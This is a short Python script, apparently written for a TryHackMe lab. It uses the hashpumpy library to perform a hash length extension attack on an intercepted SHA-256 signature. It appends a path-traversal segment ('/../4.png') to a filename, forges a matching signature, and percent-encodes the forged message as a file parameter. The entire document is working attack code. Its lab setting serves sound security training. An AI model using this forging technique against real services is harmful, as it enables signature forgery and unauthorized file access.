import hashpumpy
import urllib.parse

# Intercepted values from THM Lab
original_sig = "02d101c0ac898f9e69b7d6ec1f84a7f0d784e59bbbe057acb4cef2cf93621ba9"
original_data = "1.png"
data_to_add = "/../4.png"
secret_len = 8 # Provided in the task description

# Generate the attack
new_hash, new_message = hashpumpy.hashpump(original_sig, original_data, data_to_add, secret_len)

# Use a specific encoding to ensure the null bytes and length field are preserved
# We manually encode everything to ensure the browser/server doesn't strip characters
payload = "".join("%{0:02x}".format(b) for b in new_message)

print(f"--- ATTEMPT FOR SECRET LENGTH {secret_len} ---")
print(f"Signature: {new_hash}")
print(f"File Parameter: {payload}")
